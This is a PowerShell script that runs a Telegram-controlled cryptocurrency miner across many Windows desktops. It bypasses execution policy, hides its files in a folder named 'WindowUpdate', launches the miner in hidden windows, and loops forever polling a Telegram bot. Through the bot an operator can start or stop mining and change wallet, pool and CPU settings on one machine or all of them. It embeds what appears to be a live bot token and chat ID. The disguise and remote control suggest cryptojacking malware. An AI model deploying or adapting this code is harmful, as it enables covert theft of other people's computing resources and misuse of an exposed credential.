# Set execution policy to allow scripts 
Set-ExecutionPolicy Bypass -Scope Process -Force

# Telegram Bot Configuration
$botToken = "7467926381:AAGsW0qd5IKPmPnUdPzykWxIST9xE4NHxu4"
$chatId = "380330092"
$lastUpdateId = 0

# Mining Configuration
$batchPath = "C:\Program Files\WindowUpdate\start-mining-veruscoin.bat"
$starterBatchPath = "C:\Program Files\WindowUpdate\starter.bat"
$workerFilePath = "C:\Program Files\WindowUpdate\worker_id.txt"
$logFile = "C:\Program Files\WindowUpdate\miner_log.txt"
$tempPath = "C:\Users\$env:USERNAME\Downloads\temp\"

# Ensure temp directory exists
if (-not (Test-Path $tempPath)) { New-Item -ItemType Directory -Path $tempPath }

# Ensure workerFilePath is valid
if ($workerFilePath -and (Test-Path $workerFilePath)) {
    $workerID = Get-Content $workerFilePath | Select-Object -First 1
    if (-not $workerID) { $workerID = $env:COMPUTERNAME }
} else {
    $workerID = $env:COMPUTERNAME
}

Write-Host "DEBUG: Worker File Path: $workerFilePath"
Write-Host "DEBUG: Worker ID Detected: $workerID"

# Function to log messages
function Write-Log {
    param ($message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - [$workerID] - $message" | Out-File -Append -FilePath $logFile
}

# Function to send Telegram messages
function Send-TelegramMessage {
    param ($message)
    $url = "https://api.telegram.org/bot$botToken/sendMessage"
    $body = @{ chat_id = $chatId; text = "[$workerID] $message" } | ConvertTo-Json -Compress
    Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
    Write-Log "Sent message: $message"
}

# Function to check if SRBMiner is running
function Get-MinerStatus {
    $process = Get-Process -Name "SRBMiner-MULTI" -ErrorAction SilentlyContinue
    if ($process) { return "Mining" } else { return "Not Mining" }
}

# Function to start mining
function Start-Miner {
    $status = Get-MinerStatus
    if ($status -eq "Mining") {
        Send-TelegramMessage "Miner is already running"
    } else {
        try {
            Start-Process -FilePath $batchPath -WindowStyle Hidden
            Send-TelegramMessage "Miner started successfully"
            Write-Log "Miner started"
        } catch {
            Send-TelegramMessage "Failed to start miner: $_"
            Write-Log "Failed to start miner: $_"
        }
    }
}

# Function to stop mining
function Stop-Miner {
    $status = Get-MinerStatus
    if ($status -eq "Not Mining") {
        Send-TelegramMessage "Miner is not currently running"
    } else {
        try {
            Stop-Process -Name "SRBMiner-MULTI" -Force
            Send-TelegramMessage "Miner stopped successfully"
            Write-Log "Miner stopped"
        } catch {
            Send-TelegramMessage "Failed to stop miner: $_"
            Write-Log "Failed to stop miner: $_"
        }
    }
}

# ============================================================
# NEW: Function to launch starter.bat
# ============================================================
function Start-StarterBatch {
    if (-not (Test-Path $starterBatchPath)) {
        Send-TelegramMessage "ERROR: starter.bat not found at $starterBatchPath"
        Write-Log "ERROR: starter.bat not found at $starterBatchPath"
        return
    }
    try {
        Start-Process -FilePath $starterBatchPath -WindowStyle Hidden
        Send-TelegramMessage "Starter batch launched successfully"
        Write-Log "Starter batch launched"
    } catch {
        Send-TelegramMessage "Failed to launch starter batch: $_"
        Write-Log "Failed to launch starter batch: $_"
    }
}

# ============================================================
# Function to update batch file
# ============================================================
function Update-BatchFile {
    param ($type, $newValue)

    if (-not (Test-Path $batchPath)) {
        Write-Log "ERROR: Batch file not found at $batchPath"
        Send-TelegramMessage "ERROR: Batch file not found"
        return
    }

    $content = Get-Content $batchPath -Raw

    switch ($type) {
        "worker" {
            $pattern = '(--worker)\s+(\S+)'
            $flag = '--worker'
        }
        "pool" {
            $pattern = '(--pool)\s+(\S+)'
            $flag = '--pool'
        }
        "wallet" {
            $pattern = '(--wallet)\s+(\S+)'
            $flag = '--wallet'
        }
        "algorithm" {
            $pattern = '(--algorithm-cpu)\s+(\S+)'
            $flag = '--algorithm-cpu'
        }
        "cputhreads" {
            $pattern = '(--cpu-threads)(?!-)\s+(\S+)'
            $flag = '--cpu-threads'
        }
        "cputhreadspriority" {
            $pattern = '(--cpu-threads-priority)\s+(\S+)'
            $flag = '--cpu-threads-priority'
        }
        "cputhreadsintensity" {
            $pattern = '(--cpu-threads-intensity)\s+(\S+)'
            $flag = '--cpu-threads-intensity'
        }
        default {
            Write-Log "Unknown batch update type: $type"
            return
        }
    }

    # Backup the original batch file before making changes
    Copy-Item -Path $batchPath -Destination $tempPath -Force

    # Sanity check: does the pattern exist?
    if ($content -notmatch $pattern) {
        Write-Log "ERROR: Pattern for '$type' not found in batch file"
        Send-TelegramMessage "ERROR: Could not find '$flag' in batch file"
        return
    }

    # Replace with literal value (no regex interpretation of $newValue)
    $updatedContent = [regex]::Replace($content, $pattern, {
        param($m)
        "$($m.Groups[1].Value) $newValue"
    })

    Set-Content -Path $batchPath -Value $updatedContent -NoNewline

    Write-Log "Updated $flag to $newValue in batch file"
}

# Function to update worker ID
function Update-WorkerID {
    param ($newWorker)
    Write-Log "Changing worker ID to $newWorker"
    
    Set-Content -Path $workerFilePath -Value $newWorker
    Update-BatchFile "worker" $newWorker

    Send-TelegramMessage "Worker name changed to $newWorker"
}

# Function to change pool address
function Change-PoolAddress {
    param ($newPool)
    Write-Log "Changing pool address to $newPool"
    Update-BatchFile "pool" $newPool
    Send-TelegramMessage "Pool address changed to $newPool"
}

# Function to change wallet address
function Change-WalletAddress {
    param ($newWallet)
    Write-Log "Changing wallet address to $newWallet"
    Update-BatchFile "wallet" $newWallet
    Send-TelegramMessage "Wallet address changed to $newWallet"
}

# Function to change algorithm
function Change-Algorithm {
    param ($newAlgorithm)
    Write-Log "Changing algorithm to $newAlgorithm"
    Update-BatchFile "algorithm" $newAlgorithm
    Send-TelegramMessage "Algorithm changed to $newAlgorithm"
}

# Function to change CPU threads
function Change-CpuThreads {
    param ($newValue)
    Write-Log "Changing CPU threads to $newValue"
    Update-BatchFile "cputhreads" $newValue
    Send-TelegramMessage "CPU threads changed to $newValue"
}

# Function to change CPU threads priority
function Change-CpuThreadsPriority {
    param ($newValue)
    Write-Log "Changing CPU threads priority to $newValue"
    Update-BatchFile "cputhreadspriority" $newValue
    Send-TelegramMessage "CPU threads priority changed to $newValue"
}

# Function to change CPU threads intensity
function Change-CpuThreadsIntensity {
    param ($newValue)
    Write-Log "Changing CPU threads intensity to $newValue"
    Update-BatchFile "cputhreadsintensity" $newValue
    Send-TelegramMessage "CPU threads intensity changed to $newValue"
}

# ============================================================
# Main loop to listen for Telegram commands
# ============================================================
while ($true) {
    $updatesUrl = "https://api.telegram.org/bot$botToken/getUpdates?offset=$lastUpdateId"
    $updates = Invoke-RestMethod -Uri $updatesUrl -ErrorAction SilentlyContinue

    if ($updates.result) {
        foreach ($update in $updates.result) {
            $message = $update.message.text
            $updateId = $update.update_id

            if ($updateId -gt $lastUpdateId) {
                $lastUpdateId = $updateId
                Write-Log "Received command: $message"
                Write-Host "Received command: $message"

                # Commands for all desktops
                if ($message -eq "/status") {
                    $status = Get-MinerStatus
                    Send-TelegramMessage "Status: $status"
                }
                elseif ($message -eq "/startmining") {
                    Start-Miner
                }
                elseif ($message -eq "/stopmining") {
                    Stop-Miner
                }

                # ============================================================
                # NEW: /starter command
                # ============================================================
                elseif ($message -eq "/starter") {
                    Write-Host "Matched /starter"
                    Start-StarterBatch
                }

                # Change worker, pool, wallet, or algorithm for a specific desktop or all
                elseif ($message -match "^/changeworker\s+(\S+)\s+(\S+)$") {
                    $targetWorker = $matches[1]
                    $newWorker = $matches[2]
                    if ($targetWorker -eq "all" -or $targetWorker -eq $workerID) {
                        Update-WorkerID $newWorker
                    }
                }
                elseif ($message -match "^/changepool\s+(\S+)\s+(\S+)$") {
                    $targetWorker = $matches[1]
                    $newPool = $matches[2]
                    if ($targetWorker -eq "all" -or $targetWorker -eq $workerID) {
                        Change-PoolAddress $newPool
                    }
                }
                elseif ($message -match "^/changewallet\s+(\S+)\s+(\S+)$") {
                    $targetWorker = $matches[1]
                    $newWallet = $matches[2]
                    if ($targetWorker -eq "all" -or $targetWorker -eq $workerID) {
                        Change-WalletAddress $newWallet
                    }
                }
                elseif ($message -match "^/changealgorithm\s+(\S+)\s+(\S+)$") {
                    $targetWorker = $matches[1]
                    $newAlgorithm = $matches[2]
                    if ($targetWorker -eq "all" -or $targetWorker -eq $workerID) {
                        Change-Algorithm $newAlgorithm
                    }
                }

                # ============================================================
                # CPU threads commands
                # ============================================================
                elseif ($message -match "^/changethreads\s+(\S+)\s+(\d+)$") {
                    $targetWorker = $matches[1]
                    $newValue = $matches[2]
                    Write-Host "Matched /changethreads -> target=$targetWorker value=$newValue"
                    if ($targetWorker -eq "all" -or $targetWorker -eq $workerID) {
                        Change-CpuThreads $newValue
                    } else {
                        Write-Log "Ignored /changethreads: target '$targetWorker' != workerID '$workerID'"
                    }
                }
                elseif ($message -match "^/changepriority\s+(\S+)\s+(\d+)$") {
                    $targetWorker = $matches[1]
                    $newValue = $matches[2]
                    Write-Host "Matched /changepriority -> target=$targetWorker value=$newValue"
                    if ($targetWorker -eq "all" -or $targetWorker -eq $workerID) {
                        Change-CpuThreadsPriority $newValue
                    } else {
                        Write-Log "Ignored /changepriority: target '$targetWorker' != workerID '$workerID'"
                    }
                }
                elseif ($message -match "^/changeintensity\s+(\S+)\s+(\d+)$") {
                    $targetWorker = $matches[1]
                    $newValue = $matches[2]
                    Write-Host "Matched /changeintensity -> target=$targetWorker value=$newValue"
                    if ($targetWorker -eq "all" -or $targetWorker -eq $workerID) {
                        Change-CpuThreadsIntensity $newValue
                    } else {
                        Write-Log "Ignored /changeintensity: target '$targetWorker' != workerID '$workerID'"
                    }
                }
            }
        }
    }

    Start-Sleep -Seconds 5
}